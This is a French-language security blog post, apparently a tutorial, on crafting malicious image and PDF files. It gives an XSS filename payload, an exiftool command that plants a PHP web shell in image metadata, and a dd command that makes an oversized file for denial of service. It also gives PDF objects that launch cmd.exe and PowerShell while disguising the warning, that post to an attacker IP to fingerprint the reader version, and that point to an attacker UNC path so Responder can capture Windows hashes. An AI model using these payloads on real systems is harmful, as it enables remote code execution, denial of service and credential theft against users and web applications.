+++
date = "2020-04-26T13:37:00+00:00"
draft = false
tags = ['security']
title = "Malicious files"
author = "claw"
+++


Dans cet article nous allons voire comment créer (ou modifier des fichiers légit
imes) afin de les rendre malicieux pour l'application web ou il sera uploader ou
 pour un victime (exemple d'une piece jointe dans email).

### Images

Il existe princialment quatre principales facons de compromettre une image. A
noter que dans la majoritées des cas une image malveilante servira a compromettre 
une application web (ou les utilisateur de celle ci)

- Son nom en lui même
- Ses matadonnées  
- La steganographie
- Sa taille

##### Le nom de l'image

Si un attaquant peut uploader une image se nommant 
`><img src=x onerror=alert(0)>.jpeg` **ET** que le nom de  l'image n'est pas renommer par l'applicaion, 
il peut alors de produire une xss (cross-site scripting( injection de javascript)).

Si le noms du fichier est inseré dans une base de données une injection sql peut
 également se produire (bien plus rare cependant)

##### Les metadonnées

Une des attaques très connue est l'insertion de code dans metadonnées. Une simple
commande permet d'injecter du code php et ainsi de créer une backdoor. Elle est
surtout utilisé dans la sites en php

```bash
exiftool -Comment="<?php echo "<pre>"; system('$_GET[“cmd”]'); echo "</pre>";?>"
 evilfile.png
```

Une fois uplodée il suffit de faire une 'GET' avec firefox, elinks ou même curl,
 sur l'url de l'image

exemple:  `http://xxxxxxx.xxx/uploads/img/evilfile.png?cmd=ls`

Si le site est vulnerable, nous obtiendrons le resultats de la commande `ls` dans
une balise "pre". 

Dans de très rares cas (principalement en CTF) les metadonnées seront inserées 
dans la base de données et peut donc provoquer une injection sql.


##### Stéganographie

La stéganographie consiste à cacher des données (code, une image etc ..) dans un
 fichié sans altérer son apparence visuelle (dans le cas d'une image).

Cette technique à principalement pour but d'introduire du code malveillant dans 
un systeme (le code cependant ne sera pas executé) ou a l'inverse d'exfiltrer des
données ...

Il y a plusieurs techniques pour stéganographier:

1) La plus simple mais la plus detectable est d'ouvrir une image avec vim et d'ecrire 
**avant** le `<89>PNG^M`  (1ere ligne) ou bien à la fin après le `IEND®B<82>`

2) D'utiliser des outils tel que "steghide" qui ont pour avantage de pouvoir cacher
des fichier entier mais également de pouvoir les proteger avec un mot de passe,
et surtout d'être bien plus difficile à détecter.


##### La taille des fichiers

Si aucune verification n'est faite au niveau de l'header de l'image et de la limite de taille 
un simple `dd if=/dev/zero of=big.jpg bs=1G count=20 status=progress`
Si un attaquant se met à en uploader 20, 50 ou même 100, il peut se produire alors un 
"Deni de service" ou "deni de service distribué" en saturant la bande passante 
sur un instant T ou/et dans le temps en saturant l'éspace disque.
Si il y a une verification de l'header rien n'enpeche d'ouvrir un fichier png ou jpeg valide et de coller des GB de texte .



### Les pdfs

/!\ Dans ce cas on utilisera adobe reader 9 (plus à jours) mais toujours utilisé dans de nombreuse socités utilisent encore cette version.

Une connaissance de la structure d'un pdf est souhaité pour compre le reste de l'article.

Le [blog](https://blog.didierstevens.com) de Didier stevens est une très bonne source pour en apprendre plus sur les pdfs .

Cet [article](https://blog.didierstevens.com/2008/04/09/quickpost-about-the-physical-and-logical-structure-of-pdf-files/) explique la structure des pdf.

Pour ce point la cible sera plutot un utilisateur plutot que d'une application web comme pour le point avec les images.

A noter que les techniques utilisées pour les images visant les application web marchent également avec un pdf.


##### Powershell command

Des coomandes PowerShell peuvent être executer à partir d'un pdf.

```pdf
11 0 obj<<
    /Type
      /Action
        /S
          /Launch
            /Win << 
                /F (cmd.exe) 
                  /P (/C start powershell.exe -Command "echo 'hello, this windows will be close in 10sec...'; sleep 10"


This document is encrypted
To view the encrypted content please tick the "Do not show this message again" box
and press Open.)
            >>
>>endobj
 ```

on utilise:

- `Action/S/Launch/Win`: pour spécifier quelle action on va lancer, ici lancer une commande sur windows
- `/F (cmd.exe)`: pour lancer cmd.exe
- `/P (/C start powershell.exe -Command "....."`: les arguments passés à cmd.exe
- `This document...` + les deux lignes vides: Pour masquer le message original 
(bien que toujours visible si on scrolle vers le haut). ! Ne marche seulement sur adobe < 9.3.4


##### Javascript

Il est possible d'utiliser (dans une certaine mesure) du javascript dans un pdf. A noter que pkus de 90 % des pdf malicieux contiennent du js (et très souvent associé à une `/A | /Action`).

###### Adobe version 

L'obtention de la version d'adobe utilisée est extremement utile pour un attaquant; il lui permetera de chercher des exploits spécifiques à cette version et lar ce fait augmenter fortement les chances de réussite de l'attaque.

Pour obtenir la version, il faut faire un post vers un serveur que l'attaquant controle. En utilisant wireshark ou tcpdump, il apres possible d'identifier la version grace à l'user agent:

![adobe_version](/img/adobe_version.png)


```pdf
/S /SubmitForm
/F
<<
/F (http://172.25.0.7:8080/test.php)
/FS /URL
```

explication:

- `/S /SubmitForm`: Le type d'action (dans ce cas /SubmitForm)

- `/F (http://172.25.0.7:8080/test.php)`: l'url de la forme

- `/FS /URL`: file spec dans ce cas `/URL`


** [!] Une popup apparait et la victime doit confirmer pour que le post soit fais et le message ne peut pas etre changé (warning + url) **


##### Vol d'username et de hash

En utilisant [responder.py](https://github.com/SpiderLabs/Responder), il est possible de dérober l'username ainsi que le hash de la machine windows.

```pdt
/F (\\\\172.25.0.7\\test)
  /D [ 0 /Fit]
    /S /GoToR
```

On utilise ici `/GoToR` (go to remote) mais `/GoToE` (go to embed) marche aussi.


il faut avant de lancer l'attaque lancer sur le serveur de l'attaquant responder :<br>

```sh
sudo responder -I <INTERFACE> -wF
```

Une fois que la victime ouvre le pdf (automatique et sans popup ou avertisement).<br>

![responder](pdf/responder.png)





 
